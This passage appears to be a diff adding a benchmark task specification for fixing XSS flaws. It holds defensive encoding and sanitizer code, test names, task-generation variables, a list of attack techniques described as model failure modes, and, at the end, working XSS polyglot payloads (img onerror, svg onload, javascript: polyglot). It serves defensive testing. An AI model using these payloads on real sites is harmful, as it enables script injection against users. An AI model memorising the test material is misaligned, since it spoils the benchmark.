+      Safe JSON encoding for embedding in HTML.
+      
+      Escapes characters that could break out of script context.
+      """
+      json_str = json.dumps(value)
+      
+      # Escape HTML-breaking characters
+      json_str = json_str.replace('<', '\\u003c')
+      json_str = json_str.replace('>', '\\u003e')
+      json_str = json_str.replace('&', '\\u0026')
+      json_str = json_str.replace("'", '\\u0027')
+      json_str = json_str.replace('\u2028', '\\u2028')
+      json_str = json_str.replace('\u2029', '\\u2029')
+      
+      return json_str
+  
+  
+  # ============================================================
+  # CONTEXT-AWARE ENCODER
+  # ============================================================
+  
+  class ContextAwareEncoder:
+      """
+      Encoder that applies correct encoding based on output context.
+      """
+      
+      ENCODERS = {
+          OutputContext.HTML_CONTENT: encode_html_content,
+          OutputContext.HTML_ATTRIBUTE_QUOTED: encode_html_attribute_quoted,
+          OutputContext.HTML_ATTRIBUTE_UNQUOTED: encode_html_attribute_unquoted,
+          OutputContext.JAVASCRIPT_STRING: encode_javascript_string,
+          OutputContext.JAVASCRIPT_TEMPLATE: encode_javascript_template,
+          OutputContext.URL: encode_url,
+          OutputContext.CSS_STRING: encode_css_string,
+          OutputContext.CSS_PROPERTY: encode_css_property,
+          OutputContext.JSON: safe_json,
+      }
+      
+      @classmethod
+      def encode(cls, value: str, context: OutputContext) -> str:
+          """Encode value for specific context."""
+          encoder = cls.ENCODERS.get(context)
+          if not encoder:
+              raise ValueError(f"Unknown context: {context}")
+          return encoder(value)
+  
+  
+  # ============================================================
+  # DOM CLOBBERING PROTECTION
+  # ============================================================
+  
+  class DOMClobberProtection:
+      """
+      Prevent DOM clobbering attacks.
+      
+      DOM clobbering allows attackers to override JavaScript variables
+      by creating HTML elements with matching id/name attributes.
+      """
+      
+      # Reserved names that shouldn't be used as IDs
+      RESERVED_NAMES = {
+          'alert', 'confirm', 'prompt', 'eval', 'Function',
+          'document', 'window', 'location', 'navigator',
+          'localStorage', 'sessionStorage', 'indexedDB',
+          'fetch', 'XMLHttpRequest', 'WebSocket',
+          'config', 'settings', 'options', 'data',
+      }
+      
+      @classmethod
+      def safe_get_element_by_id(cls, element_id: str) -> Optional[Any]:
+          """
+          Safely get element, verifying it's actually an Element.
+          
+          Args:
+              element_id: ID to look up
+              
+          Returns:
+              Element or None if clobbered/not found
+          """
+          # This is pseudocode - actual implementation depends on JS environment
+          # The key is to verify the returned object is actually an Element
+          pass
+      
+      @classmethod
+      def validate_id(cls, element_id: str) -> bool:
+          """
+          Validate that an ID is safe to use.
+          
+          Args:
+              element_id: Proposed element ID
+              
+          Returns:
+              True if safe
+          """
+          if not element_id:
+              return False
+          
+          # Check against reserved names
+          if element_id.lower() in cls.RESERVED_NAMES:
+              return False
+          
+          # Check for suspicious patterns
+          if element_id.startswith('__'):
+              return False
+          
+          return True
+      
+      @classmethod
+      def safe_property_access(cls, obj: Any, prop: str, expected_type: type = str):
+          """
+          Safely access property that might be clobbered.
+          
+          Args:
+              obj: Object to access property on
+              prop: Property name
+              expected_type: Expected type of property value
+              
+          Returns:
+              Property value or None if clobbered
+          """
+          value = getattr(obj, prop, None)
+          
+          # Check type matches expectation
+          if value is not None and not isinstance(value, expected_type):
+              # Likely clobbered with an Element
+              return None
+          
+          return value
+  
+  
+  # ============================================================
+  # HTML SANITIZER
+  # ============================================================
+  
+  class HTMLSanitizer:
+      """
+      Sanitize HTML with allowlist approach.
+      
+      Only permits safe tags and attributes.
+      Prevents mutation XSS by strict parsing.
+      """
+      
+      # Allowed tags
+      ALLOWED_TAGS: Set[str] = {
+          'p', 'br', 'b', 'i', 'u', 'em', 'strong',
+          'a', 'ul', 'ol', 'li', 'blockquote', 'code', 'pre',
+          'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
+          'table', 'thead', 'tbody', 'tr', 'th', 'td',
+          'span', 'div',
+      }
+      
+      # Allowed attributes per tag
+      ALLOWED_ATTRS: Dict[str, Set[str]] = {
+          'a': {'href', 'title', 'rel'},
+          'img': {'src', 'alt', 'width', 'height'},
+          'td': {'colspan', 'rowspan'},
+          'th': {'colspan', 'rowspan'},
+      }
+      
+      # Attributes allowed on all tags
+      GLOBAL_ATTRS: Set[str] = {'class', 'id'}
+      
+      @classmethod
+      def sanitize(cls, html_input: str) -> str:
+          """
+          Sanitize HTML using allowlist.
+          
+          In production, use a dedicated library like bleach or DOMPurify.
+          This is a simplified implementation for illustration.
+          """
+          # Remove script tags and content
+          html_input = re.sub(
+              r'<script[^>]*>.*?</script>',
+              '',
+              html_input,
+              flags=re.IGNORECASE | re.DOTALL
+          )
+          
+          # Remove style tags and content
+          html_input = re.sub(
+              r'<style[^>]*>.*?</style>',
+              '',
+              html_input,
+              flags=re.IGNORECASE | re.DOTALL
+          )
+          
+          # Remove event handlers
+          html_input = re.sub(
+              r'\s+on\w+\s*=\s*["\'][^"\']*["\']',
+              '',
+              html_input,
+              flags=re.IGNORECASE
+          )
+          html_input = re.sub(
+              r'\s+on\w+\s*=\s*[^\s>]+',
+              '',
+              html_input,
+              flags=re.IGNORECASE
+          )
+          
+          # Remove javascript: URLs
+          html_input = re.sub(
+              r'javascript:',
+              'blocked:',
+              html_input,
+              flags=re.IGNORECASE
+          )
+          
+          # Remove data: URLs (can contain HTML/JS)
+          html_input = re.sub(
+              r'data:(?!image/)',
+              'blocked:',
+              html_input,
+              flags=re.IGNORECASE
+          )
+          
+          return html_input
+  
+  
+  # ============================================================
+  # CONTENT SECURITY POLICY
+  # ============================================================
+  
+  @dataclass
+  class CSPPolicy:
+      """Content Security Policy configuration."""
+      
+      default_src: List[str] = None
+      script_src: List[str] = None
+      style_src: List[str] = None
+      img_src: List[str] = None
+      font_src: List[str] = None
+      connect_src: List[str] = None
+      frame_src: List[str] = None
+      object_src: List[str] = None
+      base_uri: List[str] = None
+      form_action: List[str] = None
+      frame_ancestors: List[str] = None
+      report_uri: str = None
+      report_to: str = None
+      
+      def __post_init__(self):
+          # Set secure defaults
+          if self.default_src is None:
+              self.default_src = ["'self'"]
+          if self.script_src is None:
+              self.script_src = ["'self'"]
+          if self.style_src is None:
+              self.style_src = ["'self'"]
+          if self.object_src is None:
+              self.object_src = ["'none'"]
+          if self.base_uri is None:
+              self.base_uri = ["'self'"]
+      
+      def to_header(self) -> str:
+          """Generate CSP header value."""
+          directives = []
+          
+          if self.default_src:
+              directives.append(f"default-src {' '.join(self.default_src)}")
+          if self.script_src:
+              directives.append(f"script-src {' '.join(self.script_src)}")
+          if self.style_src:
+              directives.append(f"style-src {' '.join(self.style_src)}")
+          if self.img_src:
+              directives.append(f"img-src {' '.join(self.img_src)}")
+          if self.font_src:
+              directives.append(f"font-src {' '.join(self.font_src)}")
+          if self.connect_src:
+              directives.append(f"connect-src {' '.join(self.connect_src)}")
+          if self.frame_src:
+              directives.append(f"frame-src {' '.join(self.frame_src)}")
+          if self.object_src:
+              directives.append(f"object-src {' '.join(self.object_src)}")
+          if self.base_uri:
+              directives.append(f"base-uri {' '.join(self.base_uri)}")
+          if self.form_action:
+              directives.append(f"form-action {' '.join(self.form_action)}")
+          if self.frame_ancestors:
+              directives.append(f"frame-ancestors {' '.join(self.frame_ancestors)}")
+          if self.report_uri:
+              directives.append(f"report-uri {self.report_uri}")
+          if self.report_to:
+              directives.append(f"report-to {self.report_to}")
+          
+          return '; '.join(directives)
+  
+  
+  def create_strict_csp() -> CSPPolicy:
+      """Create a strict CSP for maximum protection."""
+      return CSPPolicy(
+          default_src=["'self'"],
+          script_src=["'self'", "'strict-dynamic'"],
+          style_src=["'self'"],
+          img_src=["'self'", "data:", "https:"],
+          font_src=["'self'"],
+          connect_src=["'self'"],
+          frame_src=["'none'"],
+          object_src=["'none'"],
+          base_uri=["'self'"],
+          form_action=["'self'"],
+          frame_ancestors=["'none'"],
+      )
+
+# === TEST CASES ===
+fail_to_pass:
+  - "test_unquoted_attribute_xss_blocked"
+  - "test_template_literal_injection_blocked"
+  - "test_dom_clobbering_prevented"
+  - "test_mxss_prevented"
+  - "test_javascript_url_blocked"
+  - "test_svg_xss_blocked"
+  - "test_unicode_bypass_blocked"
+  - "test_csp_deployed"
+  - "test_event_handlers_removed"
+  - "test_context_aware_encoding"
+
+pass_to_pass:
+  - "test_basic_html_encoding"
+  - "test_quoted_attribute_encoding"
+  - "test_legitimate_urls_allowed"
+  - "test_safe_html_preserved"
+
+# === VARIABLES FOR TASK GENERATION ===
+variables:
+  scenario_type:
+    type: string
+    options:
+      - "social platform"
+      - "content editor"
+      - "comment system"
+      - "user profile"
+      - "search results"
+      - "admin dashboard"
+      - "email template"
+      - "report generator"
+      - "API documentation"
+      - "forum posts"
+      
+  path:
+    type: path
+    generator: random_path
+    
+  platform:
+    type: string
+    options:
+      - "Node.js/Express"
+      - "Python/Django"
+      - "Python/Flask"
+      - "Ruby/Rails"
+      - "PHP/Laravel"
+      - "Java/Spring"
+      
+  language:
+    type: string
+    options:
+      - "JavaScript"
+      - "TypeScript"
+      - "Python"
+      - "Ruby"
+      - "PHP"
+      
+  framework:
+    type: string
+    options:
+      - "React"
+      - "Vue.js"
+      - "Angular"
+      - "jQuery"
+      - "Vanilla JS"
+      
+  xss_contexts:
+    type: int
+    min: 3
+    max: 10
+    
+  bypass_count:
+    type: int
+    min: 5
+    max: 30
+    
+  csp_policy:
+    type: string
+    options:
+      - "None"
+      - "default-src 'self'"
+      - "default-src 'self' 'unsafe-inline'"
+      - "script-src 'self' https://cdn.example.com"
+      
+  attacker_control:
+    type: string
+    options:
+      - "URL parameter"
+      - "Form input"
+      - "Stored content"
+      - "Cookie value"
+      - "HTTP header"
+      
+  victim_interaction:
+    type: string
+    options:
+      - "Click malicious link"
+      - "View stored content"
+      - "Submit form"
+      - "Load page"
+      
+  data_persistence:
+    type: string
+    options:
+      - "Reflected (not stored)"
+      - "Stored in database"
+      - "Stored in cache"
+      - "DOM-based (client only)"
+      
+  task_steps:
+    type: template
+    value: |
+      1. Identify all output contexts (HTML, attribute, JS, URL, CSS)
+      2. Map user input to each output point
+      3. Analyze current sanitization (if any)
+      4. Implement context-aware encoding for each context
+      5. Handle unquoted attribute context
+      6. Escape template literals properly
+      7. Add DOM clobbering protection
+      8. Validate and sanitize URLs
+      9. Deploy Content Security Policy
+      10. Test with polyglot payloads
+      11. Test with browser-specific bypasses
+      12. Add security headers
+
+# === ANTI-PATTERNS AND LLM FAILURE MODES ===
+anti_patterns:
+  llm_failure_modes:
+    - "Applying textbook attack patterns without considering mitigations"
+    - "Missing WAF/IDS bypass techniques for exploitation"
+    - "Ignoring ASLR/PIE/NX and other modern protections"
+    - "Not considering timing side-channel in crypto implementations"
+    - "Missing second-order and stored attack vectors"
+    - "Overlooking race conditions in authentication flows"
+    - "Assuming standard libraries are secure without version checking"
+    - "Missing JWT algorithm confusion and key confusion attacks"
+    - "Ignoring deserialization gadget chain discovery complexity"
+    - "Not recognizing mutation XSS through browser parser normalization"
+    - "Missing DOM clobbering to bypass security checks"
+    - "Overlooking prototype pollution leading to XSS"
+    - "Failing to identify CSP bypass via JSONP endpoints"
+    - "Not considering Angular expression sandbox bypass"
+    - "Missing SVG/MathML namespace confusion attacks"
+    - "Ignoring template literal injection (${}) in JavaScript"
+    - "Not recognizing unquoted attribute context requirements"
+    - "Overlooking javascript: URL scheme in various contexts"
+    - "Missing data: URL XSS vectors"
+    - "Failing to identify React dangerouslySetInnerHTML sinks"
+    - "Not considering Vue v-html directive vulnerabilities"
+    - "Ignoring Angular bypassSecurityTrust API misuse"
+    - "Missing DOMPurify configuration-based bypasses"
+    - "Not recognizing custom element XSS vectors"
+    - "Overlooking service worker-based XSS persistence"
+    - "Failing to identify postMessage origin bypass"
+    - "Not considering localStorage/sessionStorage XSS vectors"
+    - "Missing browser-specific parsing difference exploitation"
+    - "Ignoring Unicode normalization for filter bypass"
+
+# === ANTI-HARDCODING MEASURES ===
+anti_hardcoding:
+  canary_tokens: true
+  randomize_paths: true
+  dynamic_content: true
+  
+  xss_vectors:
+    - "script_tag_injection"
+    - "event_handler_injection"
+    - "unquoted_attribute_breakout"
+    - "template_literal_injection"
+    - "dom_clobbering"
+    - "mutation_xss"
+    - "javascript_url"
+    - "svg_xss"
+    - "unicode_bypass"
+    
+  verification_requirements:
+    - "All output contexts have appropriate encoding"
+    - "CSP is deployed and effective"
+    - "No XSS via polyglot payloads"
+    - "DOM clobbering prevented"
+
+# === CVE REFERENCES ===
+cve_references:
+  - id: "CVE-2019-8658"
+    description: "Safari mXSS vulnerability"
+    relevance: "Mutation XSS example"
+    
+  - id: "CVE-2019-14863"
+    description: "Angular expression injection"
+    relevance: "Framework-specific XSS"
+    
+  - id: "CVE-2020-11022"
+    description: "jQuery CVE"
+    relevance: "DOM manipulation XSS"
+
+# === POLYGLOT EXAMPLES ===
+polyglot_payloads:
+  - name: "Universal Polyglot"
+    payload: |
+      jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+    description: "Works across multiple contexts"
+    
+  - name: "IMG Polyglot"
+    payload: '<img src=x onerror="alert(1)">'
+    contexts: ["HTML content", "SVG"]
+    
+  - name: "SVG Polyglot"
+    payload: '<svg onload="alert(1)">'
+    contexts: ["HTML content", "XML"]
